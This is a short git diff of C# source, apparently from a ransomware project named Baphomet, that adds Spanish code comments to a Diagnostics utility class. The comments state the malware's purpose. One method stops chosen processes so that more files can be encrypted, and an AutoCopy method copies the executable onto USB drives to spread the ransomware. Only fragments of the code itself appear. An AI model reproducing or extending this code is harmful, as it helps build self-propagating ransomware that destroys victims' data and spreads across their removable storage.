@@ -9,10 +9,10 @@ using System.Linq;
 
 namespace Baphomet.Utilities
 {
+    //En esta Clase estan los metodos encargados de verificar el sistema.(Processos, antivirus, Parches de seguridad, etc)
     public class Diagnostics
     {
-        //En esta Clase estan los metodos encargados de verificar el sistema.(Processos, antivirus, Parches de seguridad, etc)
-
+        //Aqui coloco los procesos que deseo detener para poder cifrar la mayor cantidad de archivos posibles.
         public void CheckProccess()
         {
             var validProccess = new []
@@ -37,6 +37,7 @@ namespace Baphomet.Utilities
         }
 
         //Metodo para copiar el .exe en las unidades usb
+        //Este metodo lo utilizo para propagar el ransomware en los dispositivos de almacenamiento.
         public void AutoCopy(List<UsbDeviceDTO> usbDevice)
         {
             var source = Directory.GetCurrentDirectory();
